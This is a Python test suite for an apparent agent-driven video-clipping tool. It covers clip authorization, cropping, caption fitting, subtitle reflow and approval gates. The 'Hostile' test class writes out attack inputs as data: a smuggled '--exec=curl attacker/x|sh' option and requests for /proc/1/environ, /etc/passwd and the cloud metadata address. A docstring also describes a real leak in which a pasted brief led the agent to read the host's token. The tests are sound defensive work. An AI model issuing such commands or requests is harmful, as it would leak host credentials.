    def test_face_crop_honours_the_side_hint(self):
        faces = [(0.16, 0.05), (0.84, 0.05)]
        fx_left = self.M._face_crop_fraction(faces, "left", 0.32)
        fx_right = self.M._face_crop_fraction(faces, "right", 0.32)
        self.assertLess(fx_left, fx_right)

    def test_no_face_falls_back_to_none(self):
        self.assertIsNone(self.M._face_crop_fraction([], "left", 0.32))
        self.assertIsNone(self.M._face_crop_fraction([(0.8, 0.05)], "left", 0.32))

    def test_detection_absent_returns_no_faces(self):
        """A build without OpenCV or the model must degrade to the coarse preset,
        never crash. With no detector, _face_centers returns nothing."""
        saved = self.M.FACE_MODEL
        self.M.FACE_MODEL = "/nonexistent/model.onnx"
        try:
            self.assertEqual(self.M._face_centers("/nonexistent.mp4", 0, 5), [])
        finally:
            self.M.FACE_MODEL = saved


class TrustedAndAuthorize(unittest.TestCase):
    """Whether a link may be clipped is decided, not reasoned. Domain and id
    matching are pure; the playlist and channel lookups that need the network are
    driven with a fake `run` so the logic is pinned without a download."""

    def setUp(self):
        import warden_media
        self.M = warden_media

    def test_video_id_reads_every_form(self):
        for u in ("https://www.youtube.com/watch?v=OXi81V7swFo",
                  "https://youtu.be/OXi81V7swFo",
                  "https://www.youtube.com/shorts/OXi81V7swFo",
                  "OXi81V7swFo"):
            self.assertEqual(self.M.video_id(u), "OXi81V7swFo", u)
        self.assertIsNone(self.M.video_id("https://youtube.com/playlist?list=PLabc"))
        self.assertIsNone(self.M.video_id("https://example.com/x"))

    def test_a_trusted_domain_needs_no_network(self):
        ok, _ = self.M.trusted_check("https://www.youtube.com/watch?v=abcdefghijk",
                                     ["youtube.com"])
        self.assertTrue(ok)
        ok, _ = self.M.trusted_check("https://vimeo.com/1", ["youtube.com"])
        self.assertFalse(ok)

    def test_an_empty_trusted_list_trusts_nothing(self):
        ok, reason = self.M.trusted_check("https://youtube.com/watch?v=abcdefghijk", [])
        self.assertFalse(ok)
        self.assertIn("no trusted sources", reason)

    def test_authorize_matches_a_direct_link_by_id(self):
        self.M.video_title = lambda url: None      # no network in a unit test
        r = rules(sources={"archive_urls": [
            "https://www.youtube.com/watch?v=OXi81V7swFo"]})
        ok, _, _ = self.M.authorize(r, "https://youtu.be/OXi81V7swFo")
        self.assertTrue(ok)
        ok, _, _ = self.M.authorize(r, "https://youtu.be/DIFFERENT123")
        self.assertFalse(ok)

    def test_authorize_expands_a_playlist_to_find_membership(self):
        self.M.video_title = lambda url: None
        r = rules(sources={"archive_urls": [
            "https://youtube.com/playlist?list=PLauthorised"]})
        real = self.M.playlist_video_ids
        self.M.playlist_video_ids = lambda url: {"OXi81V7swFo", "aaaaaaaaaaa"}
        try:
            ok, reason, _ = self.M.authorize(r, "https://youtu.be/OXi81V7swFo")
            self.assertTrue(ok)
            self.assertIn("playlist", reason)
            ok, _, _ = self.M.authorize(r, "https://youtu.be/notinlist12")
            self.assertFalse(ok)
        finally:
            self.M.playlist_video_ids = real

    def test_a_playlist_that_cannot_be_listed_is_a_no_not_a_yes(self):
        self.M.video_title = lambda url: None
        r = rules(sources={"archive_urls": [
            "https://youtube.com/playlist?list=PLunreadable"]})
        real = self.M.playlist_video_ids
        def boom(url): raise RuntimeError("blocked")
        self.M.playlist_video_ids = boom
        try:
            ok, reason, _ = self.M.authorize(r, "https://youtu.be/OXi81V7swFo")
            self.assertFalse(ok)
            self.assertIn("could not be read", reason)
        finally:
            self.M.playlist_video_ids = real


class Signals(unittest.TestCase):
    """Evidence for viral moments, never a verdict. The tool marks where the
    language spikes; the model, which can read the clip, decides what to cut."""

    def setUp(self):
        import warden_media
        self.M = warden_media

    def test_a_question_is_a_signal(self):
        self.assertIn("question", self.M.text_signals("é sério isso?"))
        self.assertEqual(self.M.text_signals("uma frase comum"), [])

    def test_conflict_words_in_both_languages(self):
        self.assertIn("conflict", self.M.text_signals("isso é mentira"))
        self.assertIn("conflict", self.M.text_signals("that is a lie"))

    def test_a_superlative_is_a_signal(self):
        self.assertIn("superlative", self.M.text_signals("o melhor de todos"))
        self.assertIn("superlative", self.M.text_signals("the best ever"))

    def test_laughter_is_a_signal(self):
        self.assertIn("laugh", self.M.text_signals("kkkkk não acredito"))
        self.assertIn("laugh", self.M.text_signals("lmao that's wild"))

    def test_a_substring_does_not_false_match(self):
        # 'contra' is a conflict word; 'contrato' must not trip it.
        self.assertNotIn("conflict", self.M.text_signals("assinamos o contrato"))

    def test_analyze_keeps_only_segments_with_a_signal(self):
        segs = [{"start": 1.0, "end": 2.0, "text": "bom dia a todos"},
                {"start": 3.0, "end": 4.0, "text": "isso é um absurdo!"},
                {"start": 5.0, "end": 6.0, "text": "tudo bem por aqui"}]
        rows, _why = self.M.analyze_signals(segs)
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["text"], "isso é um absurdo!")
        self.assertIn("superlative", rows[0]["signals"])

    def test_analyze_without_audio_adds_no_loud_tag(self):
        segs = [{"start": 0.0, "end": 1.0, "text": "o pior de todos?"}]
        rows, _why = self.M.analyze_signals(segs)     # no source
        self.assertNotIn("loud", rows[0]["signals"])


class Hostile(unittest.TestCase):
    """Everything here arrives from a stranger: the brief is pasted, the archive
    links are read off a web page, the file names come from a remote server."""

    def setUp(self):
        import warden_media
        self.M = warden_media

    def test_a_brief_cannot_smuggle_a_command_line_option(self):
        with self.assertRaises(RuntimeError):
            self.M.safe_url("--exec=curl attacker/x|sh")

    def test_a_brief_cannot_read_the_host_filesystem(self):
        with self.assertRaises(RuntimeError):
            self.M.safe_url("file:///var/lib/plow/credentials")

    def test_only_http_and_https_are_links(self):
        for bad in ("ftp://x/y.mp4", "data:video/mp4;base64,AAA", "javascript:1", ""):
            with self.assertRaises(RuntimeError):
                self.M.safe_url(bad)
        self.assertTrue(self.M.safe_url("https://drive.google.com/file/d/a/view"))

    def test_a_brief_cannot_send_the_agent_to_read_its_own_host(self):
        """The credential leak that was live: `warden fetch file:///proc/<gw>/environ`
        read the host's Plow token, because fetch never went through safe_url.
        And a link-local http URL is the cloud metadata service. Both are the
        host's own surface, and a brief cannot be allowed to name them."""
        for internal in ("file:///etc/passwd", "file:///proc/1/environ",
                         "http://169.254.169.254/latest/meta-data/",
                         "http://127.0.0.1/", "http://localhost/",
                         "http://10.0.0.1/", "http://[::1]/"):
            with self.assertRaises(RuntimeError, msg=internal):
                self.M.safe_url(internal)

    def test_fetch_text_refuses_the_same_way_archive_does(self):
        """The hole was that safe_url guarded archive but not fetch. fetch_text
        must refuse file:// before it opens anything -- the read is the leak."""
        with self.assertRaises(RuntimeError):
            self.M.fetch_text("file:///etc/passwd")

    def test_a_redirect_is_checked_like_the_first_hop(self):
        """urllib refuses a redirect to file:// on its own, but follows one to a
        link-local http address without a word. The guard runs safe_url on the
        redirect target, so an internal redirect is refused with the same
        message rather than followed."""
        handler = self.M._GuardedRedirect()
        with self.assertRaises(RuntimeError):
            handler.redirect_request(None, None, 302, "Found", {},
                                     "http://169.254.169.254/x")

    def test_a_playlist_link_is_bounded_and_the_output_is_deterministic(self):
        """The bug the agent hit: --no-playlist on a real playlist URL left a
        stray intermediate, and videos[0] over an unordered listdir sometimes
        returned it instead of the merged file. So it picked the wrong file and
        a human 'corrected it manually', which is the archive being bypassed.
        A playlist link is now pulled as a playlist bounded to one item and
        capped per file, and the merged stem.mp4 is chosen over any residue."""
        import tempfile
        calls = {}
        out_dir = tempfile.mkdtemp(prefix="warden-dl-")

        def fake_run(args, timeout, label):
            calls["args"] = args
            stem = next(a.split(os.sep)[-1].split(".")[0]
                        for a in args if "source-" in a)
            # A partial merge left an intermediate with the same prefix, listed
            # (by chance) before the merged output.
            open(os.path.join(out_dir, stem + ".f251.webm"), "wb").write(b"x")
            open(os.path.join(out_dir, stem + ".mp4"), "wb").write(b"x")
            return ""

        real_run, real_have = self.M.run, self.M.have
        self.M.run = fake_run
        self.M.have = lambda b: True
        try:
            got = self.M._download_one(
                "https://youtube.com/playlist?list=PLabc", out_dir)
        finally:
            self.M.run, self.M.have = real_run, real_have

        self.assertTrue(got.endswith(".mp4"), got)
        self.assertNotIn(".f251.", got)
        self.assertIn("--max-filesize", calls["args"])
        self.assertIn("--playlist-items", calls["args"])
        self.assertNotIn("--no-playlist", calls["args"])

    def test_a_single_video_link_stays_no_playlist(self):
        import tempfile
        calls = {}
        out_dir = tempfile.mkdtemp(prefix="warden-dl-")

        def fake_run(args, timeout, label):
            calls["args"] = args
            stem = next(a.split(os.sep)[-1].split(".")[0]
                        for a in args if "source-" in a)
            open(os.path.join(out_dir, stem + ".mp4"), "wb").write(b"x")
            return ""

        real_run, real_have = self.M.run, self.M.have
        self.M.run = fake_run
        self.M.have = lambda b: True
        try:
            self.M._download_one("https://www.youtube.com/watch?v=abc123", out_dir)
        finally:
            self.M.run, self.M.have = real_run, real_have
        self.assertIn("--no-playlist", calls["args"])
        self.assertNotIn("--yes-playlist", calls["args"])

    def test_a_campaign_id_cannot_walk_out_of_its_directory(self):
        for bad in ("../../etc/passwd", "a/b", "..", "x\x00y"):
            with self.assertRaises(SystemExit):
                warden.safe_id(bad)
        self.assertEqual(warden.safe_id("prime-video_2026"), "prime-video_2026")

    def test_output_stays_inside_the_agents_own_directories(self):
        with self.assertRaises(SystemExit):
            warden.safe_out("/etc/anything.mp4", "clip")
        inside = os.path.join(warden.state_dir(), "clip.mp4")
        self.assertEqual(warden.safe_out(inside, "clip"), os.path.realpath(inside))

    def test_a_rejected_duration_is_decided_by_level_not_by_wording(self):
        found = warden.check(rules(), media(duration_s=45), "@brand #AD", [])
        self.assertEqual(warden.verdict(found), warden.REPROVA)
        self.assertFalse(any(lv == warden.OK and m.startswith("duration")
                             for lv, m in found))


# ════════════════════════════════════════════════════════════════════ o portão
#
# Fase 1 do briefing de correção. O clipe reprovado passou na verificação porque
# ela confere números e nenhum dos dez defeitos era numérico. O que segue pina o
# ponto em que alguma coisa olha a imagem, e o contrato de quantidade.

def _pillow_or_skip():
    try:
        import PIL  # noqa: F401
    except ImportError:
        raise unittest.SkipTest("Pillow não está instalado")


class ContactSheet(unittest.TestCase):
    """Nenhum clipe sai sem um mosaico do próprio render."""

    def setUp(self):
        _ffmpeg_or_skip()
        _pillow_or_skip()
        import warden_media, warden_style
        self.M, self.S = warden_media, warden_style
        self.dir = tempfile.mkdtemp(prefix="warden-sheet-")
        self.src = _make_source(os.path.join(self.dir, "src.mp4"))

    def test_a_sheet_is_written_beside_every_render(self):
        r = rules(video={"duration_min_s": 1, "duration_max_s": 5, "width": 1080,
                         "height": 1920, "audio": "forbidden"})
        out = os.path.join(self.dir, "clip.mp4")
        result = self.M.cut(self.src, out, r, start=0, end=4, sound="platform", crop="center")
        self.assertTrue(result.get("sheet"), "cut devolveu render sem contact sheet")
        self.assertTrue(os.path.isfile(result["sheet"]))
        from PIL import Image
        sheet = Image.open(result["sheet"])
        # Largura de quatro colunas de 300px: o mosaico é uma imagem de verdade,
        # não um arquivo vazio que existe só para satisfazer o portão.
        self.assertEqual(sheet.width, 1200)
        self.assertGreater(os.path.getsize(result["sheet"]), 10_000)

    def test_the_sheet_samples_several_distinct_frames(self):
        """Oito quadros iguais não mostram um clipe. Cada fatia vem do meio dela,
        e num testsrc2 (que muda o tempo todo) elas têm de diferir."""
        out = os.path.join(self.dir, "movel.mp4")
        r = rules(video={"duration_max_s": 6, "width": 1080, "height": 1920,
                         "audio": "forbidden"})
        self.M.cut(self.src, out, r, start=0, end=6, sound="platform", crop="center")
        sheet = self.S.contact_sheet(out, os.path.join(self.dir, "s.jpg"), tiles=8)
        from PIL import Image
        im = Image.open(sheet).convert("RGB")
        # amostra o centro de cada tile e exige variedade
        cores = {im.getpixel((c * 300 + 150, 46 + r_ * 533 + 260))
                 for r_ in range(2) for c in range(4)}
        self.assertGreater(len(cores), 4, "o mosaico repetiu o mesmo quadro")

    def test_a_render_without_a_sheet_is_not_delivered(self):
        """O MEDIA: é o que anexa o arquivo. Sem mosaico ninguém olhou o clipe,
        e a linha não sai -- foi assim que um arquivo com o hook cortado e uma
        legenda de seis linhas foi relatado como aprovado."""
        import io
        from contextlib import redirect_stdout, redirect_stderr
        r = rules(video={"duration_min_s": 1, "duration_max_s": 5, "width": 1080,
                         "height": 1920, "audio": "forbidden"},
                  caption={"required_hashtags": [], "required_mentions": [],
                           "banned_terms": []})
        out = os.path.join(self.dir, "semfolha.mp4")
        result = self.M.cut(self.src, out, r, start=0, end=4, sound="platform", crop="center")
        result["sheet"] = None                      # como se o mosaico tivesse falhado
        saida, erro = io.StringIO(), io.StringIO()
        with redirect_stdout(saida), redirect_stderr(erro):
            code = warden.deliver(result, r, "test", [])
        self.assertEqual(code, 1)
        self.assertNotIn("MEDIA:", saida.getvalue())
        self.assertIn("nothing has looked at it", erro.getvalue())

    def test_delivery_prints_the_sheet_and_the_checklist_before_the_media_line(self):
        """A ordem na tela é a ordem do trabalho: abrir a imagem, conferir os
        cinco itens, e só então entregar."""
        import io
        from contextlib import redirect_stdout, redirect_stderr
        r = rules(video={"duration_min_s": 1, "duration_max_s": 5, "width": 1080,
                         "height": 1920, "audio": "forbidden"},
                  caption={"required_hashtags": [], "required_mentions": [],
                           "banned_terms": []})
        out = os.path.join(self.dir, "comfolha.mp4")
        result = self.M.cut(self.src, out, r, start=0, end=4, sound="platform", crop="center")
        saida, erro = io.StringIO(), io.StringIO()
        with redirect_stdout(saida), redirect_stderr(erro):
            code = warden.deliver(result, r, "test", [])
        self.assertEqual(code, 0, erro.getvalue())
        texto = saida.getvalue()
        self.assertIn("SHEET:", texto)
        self.assertIn("MEDIA:", texto)
        self.assertLess(texto.index("SHEET:"), texto.index("MEDIA:"))
        for item in self.S.CHECKLIST:
            self.assertIn(item, erro.getvalue())


class BatchContract(unittest.TestCase):
    """Dois cortes pedidos são dois cortes entregues, e a conta é da ferramenta."""

    def setUp(self):
        _ffmpeg_or_skip()
        _pillow_or_skip()
        self.dir = tempfile.mkdtemp(prefix="warden-lote-")
        self.src = _make_source(os.path.join(self.dir, "src.mp4"), seconds=12)
        self.cid = "lote-teste"
        r = rules(id=self.cid,
                  video={"duration_min_s": 1, "duration_max_s": 5, "width": 1080,
                         "height": 1920, "audio": "forbidden"},
                  caption={"required_hashtags": [], "required_mentions": [],
                           "banned_terms": []})
        os.makedirs(os.path.dirname(warden.campaign_path(self.cid)), exist_ok=True)
        with open(warden.campaign_path(self.cid), "w") as fh:
            json.dump(r, fh)

    def _plan(self, clips, **extra):
        plan = {"campaign": self.cid, "source": self.src, "sound": "platform",
                "crop": "center", "clips": clips}
        plan.update(extra)
        path = os.path.join(self.dir, "plano.json")
        with open(path, "w") as fh:
            json.dump(plan, fh)
        return path

    def test_a_plan_of_two_delivers_two(self):
        import io
        from contextlib import redirect_stdout, redirect_stderr
        plan = self._plan([
            {"out": "lote-a.mp4", "start": 0, "end": 3,
             "_": "gancho: a claim"},
            {"out": "lote-b.mp4", "start": 5, "end": 8,
             "_": "gancho: a reacao"}])
        saida, erro = io.StringIO(), io.StringIO()
        with redirect_stdout(saida), redirect_stderr(erro):
            code = warden.main(["cut", "--plan", plan])
        self.assertEqual(code, 0, erro.getvalue())
        self.assertEqual(saida.getvalue().count("MEDIA:"), 2)
        self.assertIn("2 of 2 delivered", erro.getvalue())

    def test_a_batch_that_comes_up_short_exits_non_zero_and_names_the_clip(self):
        """Pediram dois, chegou um, e nada acusou a falta. Aqui acusa: o segundo
        clipe pede uma janela que não existe na fonte."""
        import io
        from contextlib import redirect_stdout, redirect_stderr
        plan = self._plan([
            {"out": "lote-ok.mp4", "start": 0, "end": 3},
            {"out": "lote-ruim.mp4"}])        # sem start/end
        saida, erro = io.StringIO(), io.StringIO()
        with redirect_stdout(saida), redirect_stderr(erro):
            code = warden.main(["cut", "--plan", plan])
        self.assertEqual(code, 1)
        self.assertEqual(saida.getvalue().count("MEDIA:"), 1)
        self.assertIn("1 of 2 delivered", erro.getvalue())
        self.assertIn("lote-ruim.mp4", erro.getvalue())
        self.assertIn("this batch is NOT done", erro.getvalue())

    def test_each_clip_is_delivered_as_it_exists_not_the_batch_at_the_end(self):
        """O primeiro MEDIA: sai antes do segundo render começar."""
        import io
        from contextlib import redirect_stdout, redirect_stderr
        plan = self._plan([
            {"out": "lote-p1.mp4", "start": 0, "end": 3},
            {"out": "lote-p2.mp4", "start": 5, "end": 8}])
        saida, erro = io.StringIO(), io.StringIO()
        with redirect_stdout(saida), redirect_stderr(erro):
            warden.main(["cut", "--plan", plan])
        linhas = [l for l in saida.getvalue().splitlines() if l.startswith("MEDIA:")]
        self.assertEqual(len(linhas), 2)
        self.assertIn("lote-p1.mp4", linhas[0])
        self.assertIn("lote-p2.mp4", linhas[1])


# ════════════════════════════════════════════════════════════════════ o texto
#
# Fase 2. Cada caso aqui é um defeito medido quadro a quadro no clipe reprovado.

class HookFits(unittest.TestCase):
    """`le apostou contra o Djokovic e ganhou 90 m` -- cortado nos dois lados em
    todos os quadros, porque drawtext não quebra linha e não ajusta corpo."""

    def setUp(self):
        _pillow_or_skip()
        import warden_style
        self.S = warden_style
        if not self.S.font_available():
            raise unittest.SkipTest("a fonte do repo não está no lugar")

    def _widest(self, lines, size):
        from PIL import Image, ImageDraw
        d = ImageDraw.Draw(Image.new("RGBA", (8, 8)))
        f = self.S._font(size)
        return max(d.textlength(l, font=f) for l in lines)

    def test_the_hook_that_was_cropped_now_fits(self):
        """A frase exata do clipe reprovado, com o quadro exato do clipe
        reprovado. 44 caracteres a 49px passavam de 1100px contra 1080px."""
        hook = "ele apostou contra o Djokovic e ganhou 90 mil"
        usable = self.S.usable_width(1080)
        lines, size, whole = self.S.fit_lines(hook, usable, 76, 34)
        self.assertTrue(whole, "faltaram palavras")
        self.assertLessEqual(len(lines), 2)
        self.assertLessEqual(self._widest(lines, size), usable)
        # e nada se perdeu no caminho
        self.assertEqual(" ".join(lines), hook.upper())

    def test_usable_width_is_the_prime_number_and_not_the_frame(self):
        """854px, não 1080: a coluna direita do TikTok reserva 140px e a margem
        esquerda come 86px. É o número do PRIME e é onde o hook foi medido."""
        self.assertEqual(self.S.usable_width(1080), 854)
        self.assertEqual(self.S.usable_width(720), 569)      # escala com o quadro

    def test_a_very_long_hook_shrinks_instead_of_overflowing(self):
        hook = ("ele apostou contra o favorito e ganhou noventa mil num "
                "domingo de manha")
        usable = self.S.usable_width(1080)
        lines, size, whole = self.S.fit_lines(hook, usable, 76, 34)
        self.assertTrue(whole, "faltaram palavras")
        self.assertLessEqual(len(lines), 2)
        self.assertLess(size, 76, "o corpo tinha de ter reduzido")
        self.assertLessEqual(self._widest(lines, size), usable)
        self.assertEqual(" ".join(lines), hook.upper())

    def test_a_hook_that_cannot_fit_says_so_instead_of_dropping_words(self):
        """O piso não é permissão para truncar. Um hook ao qual faltam palavras
        não se vê no contact sheet, e por isso tem de virar recusa aqui."""
        hook = " ".join(["palavra"] * 40)
        lines, size, whole = self.S.fit_lines(hook, self.S.usable_width(1080),
                                              76, 34)
        self.assertFalse(whole, "devia ter dito que não coube")
        self.assertEqual(size, 34, "devia ter ido até o piso antes de desistir")

    def test_a_short_hook_keeps_the_full_size_and_one_line(self):
        lines, size, whole = self.S.fit_lines(
            "ele perdeu tudo", self.S.usable_width(1080), 76, 34)
        self.assertTrue(whole)
        self.assertEqual(lines, ["ELE PERDEU TUDO"])
        self.assertEqual(size, 76)


class Scrim(unittest.TestCase):
    """Tarja preta dura de largura total lê como marca d'água de app gratuito.
    O scrim do PRIME é gradiente: alfa máximo no centro, some nas bordas."""

    def setUp(self):
        _pillow_or_skip()
        import warden_style
        self.S = warden_style
        if not self.S.font_available():
            raise unittest.SkipTest("a fonte do repo não está no lugar")
        self.dir = tempfile.mkdtemp(prefix="warden-scrim-")

    def test_the_scrim_fades_at_its_edges_instead_of_being_a_hard_bar(self):
        from PIL import Image
        png = os.path.join(self.dir, "t.png")
        png, _y = self.S.text_png(["UMA LINHA"], png, 1080, 1920, 900, 76,
                                  scrim=True)
        im = Image.open(png).convert("RGBA")
        # Uma coluna longe do texto: só o scrim vive ali. O alfa tem de subir do
        # zero até o centro do bloco e cair de novo -- uma tarja daria um degrau.
        col = [im.getpixel((20, y))[3] for y in range(im.height)]
        # O pico é o alfa do centro; num bloco de altura par o centro exato cai
        # entre dois pixels, então 1 de arredondamento é o esperado.
        self.assertGreaterEqual(max(col), self.S.SCRIM_ALPHA - 2)
        self.assertLessEqual(max(col), self.S.SCRIM_ALPHA)
        # A imagem é recortada na caixa do conteúdo, então a linha de alfa zero
        # já não está lá: a borda do scrim é ~0, não exatamente 0.
        self.assertLessEqual(min(col), 3)
        # e a subida é gradual: nenhum salto grande entre linhas vizinhas
        saltos = [abs(col[i + 1] - col[i]) for i in range(len(col) - 1)]
        self.assertLess(max(saltos), 12, "isso é um degrau de tarja, não um scrim")

    def test_the_scrim_never_reaches_full_opacity(self):
        """A imagem tem de continuar visível atrás do texto."""
        self.assertLess(self.S.SCRIM_ALPHA, 255)

    def test_the_text_is_uppercase_and_carries_a_stroke(self):
        from PIL import Image
        png = os.path.join(self.dir, "u.png")
        png, _y = self.S.text_png(["teste"], png, 400, 300, 150, 60, scrim=False)
        im = Image.open(png).convert("RGBA")
        pixels = [im.getpixel((x, y)) for x in range(0, im.width, 2)
                  for y in range(0, im.height, 2)]
        brancos = [p for p in pixels if p[3] > 200 and p[0] > 240]
        pretos = [p for p in pixels if p[3] > 200 and p[0] < 40]
        self.assertGreater(len(brancos), 40, "não desenhou o texto")
        self.assertGreater(len(pretos), 20, "sem contorno preto não se lê no feed")


class CueReflow(unittest.TestCase):
    """Um segmento de sete segundos com trinta palavras virava um bloco de seis
    linhas parado na tela, cobrindo o rosto do peito ao queixo."""

    def setUp(self):
        import warden_style
        self.S = warden_style

    def _bloco(self):
        return [{"start": 10.0, "end": 17.0, "text":
                 "I won 90k on polymarket Novak Djokovic he beat me in ping pong "
                 "at fanatics and I chose super embarrassing you know I didn't "
                 "forget that"}]

    def test_the_six_line_block_becomes_short_two_line_cues(self):
        cues = self.S.reflow_cues(self._bloco())
        self.assertGreater(len(cues), 1, "não quebrou nada")
        for c in cues:
            self.assertLessEqual(len(c["lines"]), 2, c)
            self.assertLessEqual(c["end"] - c["start"], self.S.MAX_CUE_S + 0.01, c)
            for linha in c["lines"]:
                self.assertLessEqual(len(linha), self.S.MAX_CHARS_PER_LINE + 8, linha)

    def test_no_word_is_lost_in_the_reflow(self):
        original = self._bloco()[0]["text"].split()
        saiu = " ".join(c["text"] for c in self.S.reflow_cues(self._bloco())).split()
        self.assertEqual(saiu, original)

    def test_time_is_shared_by_word_count_not_in_equal_slices(self):
        """Uma frase longa e uma interjeição não duram o mesmo."""
        cues = self.S.reflow_cues([{"start": 0.0, "end": 4.0, "text":
            "oi " + " ".join(["palavra"] * 12)}])
        duracoes = [round(c["end"] - c["start"], 2) for c in cues]
        self.assertGreater(len(set(duracoes)), 1, "repartiu em fatias iguais")

    def test_cues_never_overlap(self):
        """Duas legendas na tela ao mesmo tempo é o que a definição de pronto
        proíbe, e aqui ela sairia da nossa própria aritmética."""
        cues = self.S.reflow_cues(self._bloco() + [
            {"start": 16.5, "end": 19.0, "text": "outra fala que comeca antes"}])
        for a, b in zip(cues, cues[1:]):
            self.assertLessEqual(a["end"], b["start"] + 0.001, (a, b))

    def test_the_reflow_reaches_the_exported_ass_too(self):
        import warden_media
        ass = warden_media.to_ass(self._bloco(), 1080, 1920)
        falas = [l for l in ass.splitlines() if l.startswith("Dialogue:")]
        self.assertGreater(len(falas), 1)
        for l in falas:
            self.assertLessEqual(l.count("\\N"), 1, "mais de duas linhas numa cue")

    def test_the_ass_asks_for_the_font_in_the_repo_not_arial(self):
        """`Arial` não está instalada na imagem e o libass caía numa fallback."""
        import warden_media
        ass = warden_media.to_ass(self._bloco(), 1080, 1920)
        self.assertIn("Default,Anton,", ass)
        self.assertNotIn("Arial", ass)

    def test_the_caption_body_came_down_from_height_over_22(self):
        import warden_media
        ass = warden_media.to_ass(self._bloco(), 1080, 1920)
        corpo = int(ass.split("Default,Anton,")[1].split(",")[0])
        self.assertLess(corpo, 1920 // 22, "87px cobria o rosto")
        self.assertEqual(corpo, 1920 // 26)


class LanguageGate(unittest.TestCase):
    """Hook em português, legenda em inglês, e nada no fluxo comparava os dois."""

    def setUp(self):
        import warden_style
        self.S = warden_style

    def test_the_clip_that_shipped_is_caught(self):
        hook = "ele apostou contra o Djokovic e ganhou 90 mil"
        legenda = ("I won 90k on polymarket he beat me in ping pong at fanatics "
                   "and I was the underdog you know I didn't forget that")
        aviso = self.S.language_clash(hook, legenda)
        self.assertIsNotNone(aviso, "a divergência que saiu publicada passou")
        self.assertIn("pt", aviso)
        self.assertIn("en", aviso)

    def test_the_same_language_passes(self):
        hook = "ele apostou contra o favorito e ganhou"
        legenda = ("eu ganhei noventa mil porque ele me venceu no ping pong e "
                   "eu não esqueci disso não")
        self.assertIsNone(self.S.language_clash(hook, legenda))

    def test_a_caption_too_short_to_judge_is_not_a_clash(self):
        """None é 'não sei', e recusar por falta de evidência seria pior que o
        defeito. '90 mil' não identifica idioma nenhum."""
        self.assertIsNone(self.S.language_of("90 mil"))
        self.assertIsNone(self.S.language_clash("ele apostou contra o favorito",
                                                "90 mil"))

    def test_the_campaign_declaration_also_counts(self):
        legenda = "the thing about this is that you know what they would say"
        self.assertIsNotNone(self.S.language_clash(None, legenda, declared="pt-BR"))


class CaptionApproval(unittest.TestCase):
    """`jokovic jokovic` e uma frase que o sujeito não disse, queimadas. O
    comentário do to_srt já dizia que essa checagem é de uma pessoa; nada
    obrigava essa pessoa a existir."""

    def setUp(self):
        import warden_style
        self.S = warden_style
        self.dir = tempfile.mkdtemp(prefix="warden-aprov-")
        self.srt = os.path.join(self.dir, "c.srt")
        with open(self.srt, "w", encoding="utf-8") as fh:
            fh.write("1\n00:00:00,000 --> 00:00:02,000\numa fala\n")

    def test_an_unapproved_srt_is_refused_with_the_reason(self):
        ok, why = self.S.approval_state(self.srt)
        self.assertFalse(ok)
        self.assertIn("has not been approved", why)

    def test_approving_it_opens_the_gate(self):
        self.S.write_approval(self.srt)
        ok, why = self.S.approval_state(self.srt)
        self.assertTrue(ok, why)

    def test_editing_the_srt_after_approval_closes_it_again(self):
        """A aprovação é do CONTEÚDO. Reescrever o arquivo depois de aprovar não
        herda a aprovação -- seria a forma mais fácil de queimar o erro de volta."""
        self.S.write_approval(self.srt)
        with open(self.srt, "a", encoding="utf-8") as fh:
            fh.write("\n2\n00:00:03,000 --> 00:00:04,000\njokovic jokovic\n")
        ok, why = self.S.approval_state(self.srt)
        self.assertFalse(ok)
        self.assertIn("changed after it was approved", why)


class BurnedText(unittest.TestCase):
    """As palavras chegam na imagem, e só chegam depois de aprovadas."""

    def setUp(self):
        _ffmpeg_or_skip()
        _pillow_or_skip()
        import warden_media, warden_style
        self.M, self.S = warden_media, warden_style
        if not self.S.font_available():
            raise unittest.SkipTest("a fonte do repo não está no lugar")
        self.dir = tempfile.mkdtemp(prefix="warden-burn-")
        self.black = _make_source(os.path.join(self.dir, "black.mp4"), seconds=6,
                                  w=1920, h=1080, audio=False, pattern="black")
        self.srt = os.path.join(self.dir, "cap.srt")
        with open(self.srt, "w", encoding="utf-8") as fh:
            fh.write(self.M.to_srt([{"start": 0.0, "end": 2.0,
                                     "text": "primeira fala do teste"},
                                    {"start": 2.2, "end": 4.0,
                                     "text": "segunda fala do teste"}]))
        self.r = rules(video={"duration_max_s": 5, "width": 1080, "height": 1920,
                              "audio": "forbidden"})

    def _white(self, mp4, at=1.0):
        import subprocess
        png = mp4 + f".{at}.png"
        subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-ss", str(at),
                        "-i", mp4, "-frames:v", "1", png], check=True,
                       capture_output=True)
        raw = subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-i", png,
                              "-f", "rawvideo", "-pix_fmt", "gray", "pipe:1"],
                             capture_output=True).stdout
        return sum(1 for b in raw if b > 200)

    def test_an_unapproved_srt_renders_a_clip_with_no_caption(self):
        """Sem aprovação o clipe sai MUDO de legenda, não errado: um clipe sem
        legenda se conserta, um `jokovic jokovic` publicado não."""
        out = os.path.join(self.dir, "semaprovar.mp4")
        result = self.M.cut(self.black, out, self.r, start=0, end=3,
                            sound="platform", crop="center", caption_srt=self.srt)
        self.assertLess(self._white(out), 500, "queimou sem aprovação")
        self.assertTrue(any("has not been approved" in n for n in result["notes"]))

    def test_an_approved_srt_actually_lands_on_the_picture(self):
        self.S.write_approval(self.srt)
        out = os.path.join(self.dir, "aprovado.mp4")
        result = self.M.cut(self.black, out, self.r, start=0, end=3,
                            sound="platform", crop="center", caption_srt=self.srt)
        self.assertGreater(self._white(out), 3000, "nenhuma palavra chegou na imagem")
        self.assertTrue(any("caption cues" in n for n in result["notes"]))

    def test_a_cue_leaves_the_screen_when_its_window_ends(self):
        """Um texto de 2s que não sai mais da tela é o bloco parado de novo."""
        # Vão de 1s: falas separadas por menos de 0,4s são juntadas de propósito
        # (é o que impede a legenda de sair picada em cues de duas palavras), e
        # o que se prova aqui é que a cue SAI, não que o vão sobrevive.
        pausado = os.path.join(self.dir, "pausado.srt")
        with open(pausado, "w", encoding="utf-8") as fh:
            fh.write(self.M.to_srt([{"start": 0.0, "end": 1.5,
                                     "text": "primeira fala do teste"},
                                    {"start": 2.5, "end": 4.0,
                                     "text": "segunda fala do teste"}]))
        self.S.write_approval(pausado)
        out = os.path.join(self.dir, "sai.mp4")
        self.M.cut(self.black, out, self.r, start=0, end=3, sound="platform", crop="center",
                   caption_srt=pausado)
        self.assertGreater(self._white(out, at=0.7), 2000, "a cue não apareceu")
        self.assertLess(self._white(out, at=2.0), 500,
                        "a cue anterior ficou carimbada depois do fim da janela")

